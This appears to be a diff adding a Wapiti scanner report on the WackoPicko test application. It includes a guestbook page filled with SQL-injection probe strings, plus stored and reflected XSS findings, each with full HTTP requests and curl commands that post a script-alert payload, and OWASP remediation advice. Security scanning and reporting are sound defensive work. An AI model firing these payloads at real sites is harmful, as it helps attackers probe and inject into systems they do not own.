+	&lt;p&gt; - by fuzz&amp;#039;) AND 20=60 AND (&amp;#039;32&amp;#039;=&amp;#039;32 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;#039;) AND 54=54 AND (&amp;#039;56&amp;#039;=&amp;#039;56 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;quot;) AND 57=133 AND (&amp;quot;11&amp;quot;=&amp;quot;11 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;quot;) AND 74=145 AND (&amp;quot;89&amp;quot;=&amp;quot;89 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;quot;) AND 57=57 AND (&amp;quot;67&amp;quot;=&amp;quot;67 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default¿&amp;#039;&amp;quot;( &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;default¿&#39;&#34;(&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default AND 28=116 AND 77=77 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default AND 14=94 AND 88=88 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default AND 39=39 AND 43=43 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;#039; AND 58=82 AND &amp;#039;84&amp;#039;=&amp;#039;84 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;#039; AND 97=186 AND &amp;#039;22&amp;#039;=&amp;#039;22 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;#039; AND 10=10 AND &amp;#039;28&amp;#039;=&amp;#039;28 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;quot; AND 81=146 AND &amp;quot;11&amp;quot;=&amp;quot;11 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;quot; AND 87=117 AND &amp;quot;32&amp;quot;=&amp;quot;32 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;quot; AND 35=35 AND &amp;quot;25&amp;quot;=&amp;quot;25 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default) AND 37=99 AND (39=39 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default) AND 39=122 AND (50=50 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default) AND 98=98 AND (35=35 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;#039;) AND 27=114 AND (&amp;#039;94&amp;#039;=&amp;#039;94 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;#039;) AND 60=85 AND (&amp;#039;54&amp;#039;=&amp;#039;54 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;#039;) AND 18=18 AND (&amp;#039;47&amp;#039;=&amp;#039;47 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;quot;) AND 44=121 AND (&amp;quot;79&amp;quot;=&amp;quot;79 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;quot;) AND 44=136 AND (&amp;quot;16&amp;quot;=&amp;quot;16 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;quot;) AND 58=58 AND (&amp;quot;26&amp;quot;=&amp;quot;26 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there! AND 90=174 AND 37=37&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there! AND 86=101 AND 42=42&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there! AND 57=57 AND 95=95&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#39; AND 13=95 AND &#39;95&#39;=&#39;95&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#39; AND 85=157 AND &#39;46&#39;=&#39;46&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#39; AND 17=17 AND &#39;32&#39;=&#39;32&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#34; AND 44=63 AND &#34;58&#34;=&#34;58&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz¿&#39;&#34;(&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz¿&amp;#039;&amp;quot;( &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz AND 58=114 AND 90=90&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz AND 28=67 AND 51=51&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz AND 58=58 AND 41=41&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#39; AND 50=122 AND &#39;59&#39;=&#39;59&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#39; AND 63=134 AND &#39;92&#39;=&#39;92&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#39; AND 17=17 AND &#39;91&#39;=&#39;91&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#34; AND 96=189 AND &#34;60&#34;=&#34;60&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#34; AND 89=173 AND &#34;35&#34;=&#34;35&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#34; AND 66=66 AND &#34;90&#34;=&#34;90&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz) AND 84=157 AND (25=25&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz) AND 53=152 AND (85=85&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz) AND 32=32 AND (97=97&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#39;) AND 50=84 AND (&#39;10&#39;=&#39;10&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#39;) AND 91=148 AND (&#39;63&#39;=&#39;63&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#39;) AND 60=60 AND (&#39;62&#39;=&#39;62&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#34;) AND 10=88 AND (&#34;47&#34;=&#34;47&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#34;) AND 58=78 AND (&#34;74&#34;=&#34;74&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#34;) AND 55=55 AND (&#34;45&#34;=&#34;45&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz AND 77=160 AND 45=45 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz AND 79=104 AND 47=47 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi, I love your site!&lt;/p&gt;
+	&lt;p&gt; - by adam &lt;/p&gt;
+	
+
+
+
+&lt;form action=&#34;/guestbook.php&#34; method=&#34;POST&#34;&gt;
+   Name: &lt;br&gt;
+   &lt;input type=&#34;text&#34; name=&#34;name&#34; /&gt;&lt;br&gt;
+   Comment: &lt;br&gt;
+   &lt;textarea id=&#34;comment-box&#34; name=&#34;comment&#34;&gt;&lt;/textarea&gt; &lt;br&gt;
+   &lt;input type=&#34;submit&#34; value=&#34;Submit&#34; /&gt;
+&lt;/form&gt;
+
+
+&lt;/div&gt;
+       &lt;div class=&#34;column span-24 first last&#34; id=&#34;footer&#34; &gt;
+	&lt;ul&gt;
+	  &lt;li&gt;&lt;a href=&#34;/&#34;&gt;Home&lt;/a&gt; |&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&#34;/admin/index.php?page=login&#34;&gt;Admin&lt;/a&gt; |&lt;/li&gt;
+	  &lt;li&gt;&lt;a href=&#34;mailto:contact@wackopicko.com&#34;&gt;Contact&lt;/a&gt; |&lt;/li&gt;
+	  &lt;li&gt;&lt;a href=&#34;/tos.php&#34;&gt;Terms of Service&lt;/a&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+   
+                                </pre>
+                            </section>
+                        <section id="tab-vuln-17-1-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://web/guestbook.php&#34; -e &#34;http://web/guestbook.php&#34; -d &#34;name=default&amp;comment=%3CScRiPt%3Ealert%28%27wr3t6z3yuc%27%29%3C%2FsCrIpT%3E&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-17-1-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-01&#39;]</pre>
+                        </section>
+
+                <dl><dt>Solutions</dt><dd>The best way to protect a web application from XSS attacks is ensure that the application performs validation of all headers, cookies, query strings, form fields, and hidden fields. Encoding user supplied output in the server side can also defeat XSS vulnerabilities by preventing inserted scripts from being transmitted to users in an executable form. Applications can gain significant protection from javascript based attacks by converting the following characters in all generated output to the appropriate HTML entity encoding:<, >, &, ', (, ), #, %, ; , +, -</dd></dl>
+                <h5>References</h5>
+                <ul>
+                    <li><a href="https://owasp.org/www-community/attacks/xss/">OWASP: Cross Site Scripting (XSS)</a></li>
+                    <li><a href="https://en.wikipedia.org/wiki/Cross-site_scripting">Wikipedia: Cross-site scripting</a></li>
+                    <li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation (&#39;Cross-site Scripting&#39;)</a></li>
+                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting">OWASP: Reflected Cross Site Scripting</a></li>
+                </ul>
+                <br />
+                <hr>
+                <h3 id="vuln_type_18">Secure Flag cookie</h3>
+                <dl>
+                    <dt>Description</dt>
+                    <dd>The secure flag is an option that can be set by the application server when sending a new cookie to the user within an HTTP Response. The purpose of the secure flag is to prevent cookies from being observed by unauthorized parties due to the transmission of a the cookie in clear text.</dd>
+                </dl>
+
+                        <h4>🟡 Vulnerability found in /guestbook.php</h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-18-0-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-18-0-2">HTTP Request</a>
+                            <a href="#tab-vuln-18-0-4">cURL command line</a>
+                            <a href="#tab-vuln-18-0-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-18-0-1" style="min-height: 124px;">
+                            <pre>Secure flag is not set in the cookie : PHPSESSID</pre>
+                        </section>
+                        <section id="tab-vuln-18-0-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal;">
+                                    GET /guestbook.php HTTP/1.1
+                                    <br>
+                                    host: web
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    cookie: PHPSESSID=pcoa73bfhae7c51btkm85asfgs
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-18-0-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://web/guestbook.php&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-18-0-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-SESS-02&#39;]</pre>
+                        </section>
+
+                <dl><dt>Solutions</dt><dd>When generating the cookie, make sure to set the Secure Flag to True.</dd></dl>
+                <h5>References</h5>
+                <ul>
+                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.html">OWASP: Testing for Cookies Attributes</a></li>
+                    <li><a href="https://owasp.org/www-community/controls/SecureCookieAttribute">OWASP: Secure Cookie Attribute</a></li>
+                </ul>
+                <br />
+                <hr>
+                <h3 id="vuln_type_24">Stored Cross Site Scripting</h3>
+                <dl>
+                    <dt>Description</dt>
+                    <dd>Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications which allow code injection by malicious web users into the web pages viewed by other users. Examples of such code include HTML code and client-side scripts.</dd>
+                </dl>
+
+                        <h4>🔴 Vulnerability found in /guestbook.php</h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-24-0-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-24-0-2">HTTP Request</a>
+                            <a href="#tab-vuln-24-0-4">cURL command line</a>
+                            <a href="#tab-vuln-24-0-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-24-0-1" style="min-height: 124px;">
+                            <pre>Stored Cross Site Scripting vulnerability found via injection in the parameter comment</pre>
+                        </section>
+                        <section id="tab-vuln-24-0-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal;">
+                                    POST /guestbook.php HTTP/1.1
+                                    <br>
+                                    host: web
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    cookie: PHPSESSID=pcoa73bfhae7c51btkm85asfgs
+                                    <br>
+                                    content-length: 72
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    comment=%3CScRiPt%3Ealert%28%27wyv86vk1mx%27%29%3C%2FsCrIpT%3E&amp;name=fuzz
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-24-0-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://web/guestbook.php&#34; -d &#34;comment=%3CScRiPt%3Ealert%28%27wyv86vk1mx%27%29%3C%2FsCrIpT%3E&amp;name=fuzz&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-24-0-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-02&#39;]</pre>
+                        </section>
+                        <h4>🔴 Vulnerability found in /guestbook.php</h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-24-1-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-24-1-2">HTTP Request</a>
+                            <a href="#tab-vuln-24-1-4">cURL command line</a>
+                            <a href="#tab-vuln-24-1-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-24-1-1" style="min-height: 124px;">
+                            <pre>Stored Cross Site Scripting vulnerability found via injection in the parameter comment</pre>
+                        </section>
+                        <section id="tab-vuln-24-1-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal;">
+                                    POST /guestbook.php HTTP/1.1
+                                    <br>
+                                    host: web
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    referer: http://web/guestbook.php
+                                    <br>
+                                    cookie: PHPSESSID=pcoa73bfhae7c51btkm85asfgs
+                                    <br>
+                                    content-length: 75
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    name=default&amp;comment=%3CScRiPt%3Ealert%28%27wr3t6z3yuc%27%29%3C%2FsCrIpT%3E
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-24-1-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://web/guestbook.php&#34; -e &#34;http://web/guestbook.php&#34; -d &#34;name=default&amp;comment=%3CScRiPt%3Ealert%28%27wr3t6z3yuc%27%29%3C%2FsCrIpT%3E&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-24-1-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-02&#39;]</pre>
+                        </section>
+                        <h4>🔴 Vulnerability found in /guestbook.php</h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-24-2-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-24-2-2">HTTP Request</a>
+                            <a href="#tab-vuln-24-2-4">cURL command line</a>
+                            <a href="#tab-vuln-24-2-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-24-2-1" style="min-height: 124px;">
+                            <pre>Stored Cross Site Scripting vulnerability found via injection in the parameter comment</pre>
+                        </section>
+                        <section id="tab-vuln-24-2-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal;">
+                                    POST /guestbook.php HTTP/1.1
+                                    <br>
+                                    host: web
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    cookie: PHPSESSID=pcoa73bfhae7c51btkm85asfgs
+                                    <br>
+                                    content-length: 72
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    comment=%3CScRiPt%3Ealert%28%27wyv86vk1mx%27%29%3C%2FsCrIpT%3E&amp;name=fuzz
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-24-2-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://web/guestbook.php&#34; -d &#34;comment=%3CScRiPt%3Ealert%28%27wyv86vk1mx%27%29%3C%2FsCrIpT%3E&amp;name=fuzz&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-24-2-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-02&#39;]</pre>
+                        </section>
+                        <h4>🔴 Vulnerability found in /guestbook.php</h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-24-3-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-24-3-2">HTTP Request</a>
+                            <a href="#tab-vuln-24-3-4">cURL command line</a>
+                            <a href="#tab-vuln-24-3-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-24-3-1" style="min-height: 124px;">
+                            <pre>Stored Cross Site Scripting vulnerability found via injection in the parameter comment</pre>
+                        </section>
+                        <section id="tab-vuln-24-3-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal;">
+                                    POST /guestbook.php HTTP/1.1
+                                    <br>
+                                    host: web
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    referer: http://web/guestbook.php
+                                    <br>
+                                    cookie: PHPSESSID=pcoa73bfhae7c51btkm85asfgs
+                                    <br>
+                                    content-length: 75
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    name=default&amp;comment=%3CScRiPt%3Ealert%28%27wr3t6z3yuc%27%29%3C%2FsCrIpT%3E
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-24-3-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://web/guestbook.php&#34; -e &#34;http://web/guestbook.php&#34; -d &#34;name=default&amp;comment=%3CScRiPt%3Ealert%28%27wr3t6z3yuc%27%29%3C%2FsCrIpT%3E&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-24-3-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-02&#39;]</pre>
+                        </section>
+                        <h4>🔴 Vulnerability found in /guestbook.php</h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-24-4-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-24-4-2">HTTP Request</a>
+                            <a href="#tab-vuln-24-4-4">cURL command line</a>
+                            <a href="#tab-vuln-24-4-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-24-4-1" style="min-height: 124px;">
+                            <pre>Stored Cross Site Scripting vulnerability found via injection in the parameter comment</pre>
+                        </section>
+                        <section id="tab-vuln-24-4-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal;">
+                                    POST /guestbook.php HTTP/1.1
+                                    <br>
+                                    host: web
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    cookie: PHPSESSID=pcoa73bfhae7c51btkm85asfgs
+                                    <br>
+                                    content-length: 72
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    comment=%3CScRiPt%3Ealert%28%27wyv86vk1mx%27%29%3C%2FsCrIpT%3E&amp;name=fuzz
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-24-4-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://web/guestbook.php&#34; -d &#34;comment=%3CScRiPt%3Ealert%28%27wyv86vk1mx%27%29%3C%2FsCrIpT%3E&amp;name=fuzz&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-24-4-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-02&#39;]</pre>
+                        </section>
+                        <h4>🔴 Vulnerability found in /guestbook.php</h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-24-5-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-24-5-2">HTTP Request</a>
+                            <a href="#tab-vuln-24-5-4">cURL command line</a>
+                            <a href="#tab-vuln-24-5-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-24-5-1" style="min-height: 124px;">
+                            <pre>Stored Cross Site Scripting vulnerability found via injection in the parameter comment</pre>
+                        </section>
+                        <section id="tab-vuln-24-5-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal;">
+                                    POST /guestbook.php HTTP/1.1
+                                    <br>
+                                    host: web
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    referer: http://web/guestbook.php
+                                    <br>
+                                    cookie: PHPSESSID=pcoa73bfhae7c51btkm85asfgs
+                                    <br>
+                                    content-length: 75
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    name=default&amp;comment=%3CScRiPt%3Ealert%28%27wr3t6z3yuc%27%29%3C%2FsCrIpT%3E
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-24-5-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://web/guestbook.php&#34; -e &#34;http://web/guestbook.php&#34; -d &#34;name=default&amp;comment=%3CScRiPt%3Ealert%28%27wr3t6z3yuc%27%29%3C%2FsCrIpT%3E&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-24-5-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-02&#39;]</pre>
+                        </section>
+
+                <dl><dt>Solutions</dt><dd>The best way to protect a web application from XSS attacks is ensure that the application performs validation of all headers, cookies, query strings, form fields, and hidden fields. Encoding user supplied output in the server side can also defeat XSS vulnerabilities by preventing inserted scripts from being transmitted to users in an executable form. Applications can gain significant protection from javascript based attacks by converting the following characters in all generated output to the appropriate HTML entity encoding:<, >, &, ', (, ), #, %, ; , +, -</dd></dl>
+                <h5>References</h5>
+                <ul>
+                    <li><a href="https://owasp.org/www-community/attacks/xss/">OWASP: Cross Site Scripting (XSS)</a></li>
+                    <li><a href="https://en.wikipedia.org/wiki/Cross-site_scripting">Wikipedia: Cross-site scripting</a></li>
+                    <li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation (&#39;Cross-site Scripting&#39;)</a></li>
+                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting">OWASP: Stored Cross Site Scripting</a></li>
+                </ul>
+                <br />
+                <hr>
+        </div>
+        <footer class="small" id="footer"><a href="https://wapiti-scanner.github.io/" id="wapiti_link">Wapiti 3.1.8</a> &copy; Nicolas SURRIBAS 2006-2022</footer>
+	</div>
+    <script type="text/javascript" src="js/kube.min.js"></script>
